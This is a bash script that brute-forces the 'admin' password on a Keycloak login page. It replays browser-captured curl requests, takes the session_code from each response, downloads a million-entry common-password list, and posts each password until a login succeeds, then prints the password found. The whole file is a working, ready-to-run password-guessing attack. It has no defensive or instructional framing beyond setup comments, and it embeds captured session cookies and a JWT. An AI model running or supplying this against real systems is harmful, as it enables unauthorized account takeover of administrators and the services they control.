#!/bin/bash

# Get the GET request to Keycloak login form as a cURL command in the browser's developer mode and set it to the value of CURL_GET_CMD:
CURL_GET_CMD="curl 'http://keycloak:8080/auth/realms/master/login-actions/authenticate?execution=5b3c02b1-3785-4610-a826-b5387f6373aa&client_id=648163aa-4e6d-407e-a690-e81746acad50&tab_id=uQSd0SjdecA' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Accept-Language: ja,en-US;q=0.9,en;q=0.8' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: AUTH_SESSION_ID_LEGACY=e6b42bf5-2d63-4f0d-87f1-80988ad45e94.8e5044e808f6; KC_RESTART=eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJkYmQ0M2VkMi01ZjhiLTRiYzgtYjEzNS00ZjM3NDVhY2VhODQifQ.eyJjaWQiOiI2NDgxNjNhYS00ZTZkLTQwN2UtYTY5MC1lODE3NDZhY2FkNTAiLCJwdHkiOiJvcGVuaWQtY29ubmVjdCIsInJ1cmkiOiJodHRwOi8vMTkyLjE2OC4xLjQxOjgwODAvY2FsbGJhY2siLCJhY3QiOiJBVVRIRU5USUNBVEUiLCJub3RlcyI6eyJzY29wZSI6Im9wZW5pZCBwcm9maWxlIiwiaXNzIjoiaHR0cDovLzE5Mi4xNjguMS40MTo4MTgwL2F1dGgvcmVhbG1zL21hc3RlciIsInJlc3BvbnNlX3R5cGUiOiJjb2RlIiwicmVkaXJlY3RfdXJpIjoiaHR0cDovLzE5Mi4xNjguMS40MTo4MDgwL2NhbGxiYWNrIiwic3RhdGUiOiI3OTRiOWIyMy1lNWE4LTQwNTEtYjc2Mi0zOTMyZGQxZWJiOGEiLCJub25jZSI6ImE5NTRlZWRlLTA3ZGEtNGM4Ni1iYTMyLTUyNDIyZGU2MWI5ZSJ9fQ.00yQNHpm7VeDJV2ljpJNUyaQ56uWMfbqZR69G22rmak; JSESSIONID=1D2FA8EFA9D9A073B11FBE5BD5E16D02.8e5044e808f6; JSESSIONID=27CBB881F135045F9F48E91F2E781B2F' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36' \
  --compressed \
  --insecure"

# Get the POST request to Keycloak login form with ID and incorrect password as a cURL command in the browser's developer mode and set it to the value of CURL_POST_CMD:
CURL_POST_CMD="curl 'http://keycloak:8080/auth/realms/master/login-actions/authenticate?session_code=IUKZvf-XPrGTVT7w85cHOe6Q59XQIySSkCsONFcf50w&execution=5b3c02b1-3785-4610-a826-b5387f6373aa&client_id=648163aa-4e6d-407e-a690-e81746acad50&tab_id=uQSd0SjdecA' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Accept-Language: ja,en-US;q=0.9,en;q=0.8' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: AUTH_SESSION_ID_LEGACY=e6b42bf5-2d63-4f0d-87f1-80988ad45e94.8e5044e808f6; KC_RESTART=eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJkYmQ0M2VkMi01ZjhiLTRiYzgtYjEzNS00ZjM3NDVhY2VhODQifQ.eyJjaWQiOiI2NDgxNjNhYS00ZTZkLTQwN2UtYTY5MC1lODE3NDZhY2FkNTAiLCJwdHkiOiJvcGVuaWQtY29ubmVjdCIsInJ1cmkiOiJodHRwOi8vMTkyLjE2OC4xLjQxOjgwODAvY2FsbGJhY2siLCJhY3QiOiJBVVRIRU5USUNBVEUiLCJub3RlcyI6eyJzY29wZSI6Im9wZW5pZCBwcm9maWxlIiwiaXNzIjoiaHR0cDovLzE5Mi4xNjguMS40MTo4MTgwL2F1dGgvcmVhbG1zL21hc3RlciIsInJlc3BvbnNlX3R5cGUiOiJjb2RlIiwicmVkaXJlY3RfdXJpIjoiaHR0cDovLzE5Mi4xNjguMS40MTo4MDgwL2NhbGxiYWNrIiwic3RhdGUiOiI3OTRiOWIyMy1lNWE4LTQwNTEtYjc2Mi0zOTMyZGQxZWJiOGEiLCJub25jZSI6ImE5NTRlZWRlLTA3ZGEtNGM4Ni1iYTMyLTUyNDIyZGU2MWI5ZSJ9fQ.00yQNHpm7VeDJV2ljpJNUyaQ56uWMfbqZR69G22rmak; JSESSIONID=1D2FA8EFA9D9A073B11FBE5BD5E16D02.8e5044e808f6; JSESSIONID=27CBB881F135045F9F48E91F2E781B2F' \
  -H 'Origin: null' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36' \
  --data-raw 'username=admin&password=aaaaaaaaaaa&credentialId=' \
  --compressed \
  --insecure"

echo $CURL_GET_CMD
echo $CURL_POST_CMD

GET_SCD_CMD="$CURL_GET_CMD |grep  -o -E session_code\=.*\& | sed 's/\&.*//'"
echo $GET_SCD_CMD

SCD=$(eval ${GET_SCD_CMD})
echo $SCD

CURL_POST_CMD=${CURL_POST_CMD/session_code=*\&execution=/$SCD&execution=}
echo $CURL_POST_CMD

RES=$(eval ${CURL_POST_CMD})
echo $RES

GET_SCD_CMD="echo '$RES' |grep  -o -E session_code\=.*\& | sed 's/\&.*//'"
SCD=$(eval ${GET_SCD_CMD})
echo $SCD
if [ -z "$SCD" ]; then
  echo "Get new curl commands and change CURL_GET_CMD and CURL_POST_CMD lines."
  exit 
fi

curl -OL https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
while read line
do
  CURL_POST_CMD=${CURL_POST_CMD/session_code=*\&execution=/$SCD&execution=}
  CURL_POST_CMD=${CURL_POST_CMD/password=*\&credentialId=/password=$line&credentialId=}
  RES=$(eval ${CURL_POST_CMD})
  GET_SCD_CMD="echo '$RES' |grep  -o -E session_code\=.*\& | sed 's/\&.*//'"
  SCD=$(eval ${GET_SCD_CMD})
  if [ -z "$SCD" ]; then
    echo "password: $line"
    break
  fi
done < 10-million-password-list-top-1000000.txt
